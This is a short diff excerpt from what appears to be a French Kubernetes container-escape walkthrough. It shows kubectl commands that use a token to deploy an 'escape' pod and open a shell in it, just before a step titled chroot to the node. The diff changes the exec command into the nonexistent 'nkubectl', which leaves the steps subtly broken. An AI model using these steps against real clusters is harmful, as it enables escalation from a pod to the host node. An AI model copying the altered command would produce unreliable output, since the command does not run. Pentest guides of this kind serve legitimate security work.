@@ -64,7 +64,7 @@ spec:
 
 ```bash
 kubectl --token=<token> -n <namespace> apply -f escape.yaml
-kubectl --token=<token> -n <namespace> exec -it escape -- sh
+nkubectl --token=<token> -n <namespace> exec -it escape -- sh
 ```
 
 ### 4. Chroot vers le node
